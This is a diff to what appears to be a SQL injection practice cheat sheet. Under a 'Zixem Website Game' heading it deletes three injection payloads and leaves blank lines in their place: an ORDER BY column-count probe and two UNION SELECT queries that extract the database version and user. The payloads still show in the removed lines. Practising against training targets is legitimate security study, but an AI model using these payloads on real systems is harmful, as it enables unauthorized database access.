@@ -95,17 +95,17 @@ There are some of the queries below that only the `admin` user can run; in those
 ----
 # Zixem Website Game
 ----
-```
-=-1' order by 1,2,3,4,5,6,7,8-- -
-```
-and
-```
-union all SELECT version(), user(), null null
-```
-and
-```
-union all select version(),user(),3,4 -- -
-```
+   
+                                 
+   
+   
+   
+                                             
+   
+   
+   
+                                          
+   
 ----
 
 # BuggyWebApp (SEARCH/GET)
